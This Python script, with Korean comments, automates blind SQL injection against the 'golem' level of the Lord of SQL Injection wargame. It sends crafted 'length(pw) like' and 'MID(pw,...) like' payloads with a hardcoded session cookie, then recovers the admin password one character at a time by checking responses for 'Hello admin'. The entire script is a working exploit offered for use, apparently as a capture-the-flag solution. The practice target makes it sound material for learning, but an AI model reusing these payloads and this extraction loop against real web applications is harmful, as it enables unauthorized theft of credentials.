import urllib.request   # python 라이브러리에 내장된 urllib.request 를 불러온다.
from urllib.parse import quote

result = "" # pw 값을 저장할 문자열 변수
pwlen = 0

for i in range(1,10):
    url = "http://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php?pw="
    add_url = "' || length(pw) like {} -- ;".format(i)
    print("Searching Password Length.. [{}]".format(i))
    add_url = quote(add_url)
    new_url = url + add_url
    re = urllib.request.Request(new_url)
    re.add_header("User-Agent","Mozilla/5.0")
    re.add_header("Cookie", "PHPSESSID=6d7n06fn55kjoc4fas5vuh24j4")
    response = urllib.request.urlopen(re)

    if str(response.read()).find("Hello admin") != -1:
        pwlen = i
        print("Found length!! => {}".format(pwlen))
        break

for i in range(1,pwlen+1):
    for j in range(ord('0'),ord('z')):
        url = "http://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php?pw="
        add_url = "' || id like 'admin' && MID(pw,1,{}) like '{}' -- ;".format(str(i), result+chr(j))
        print("Searching.. - {0}{1}".format(url, add_url))
        add_url = quote(add_url)
        new_url = url + add_url
        re = urllib.request.Request(new_url)


        re.add_header("User-Agent","Mozilla/5.0")
        re.add_header("Cookie", "PHPSESSID=6d7n06fn55kjoc4fas5vuh24j4")

        request = urllib.request.urlopen(re)

        if str(request.read()).find("Hello admin") != -1:
            result += chr(j).lower()
            print("Found it!! => " + result)
            break
print("Finished Searching.")
print("Password : " + result)

# My actual was lost due to distro hopping and not committing to github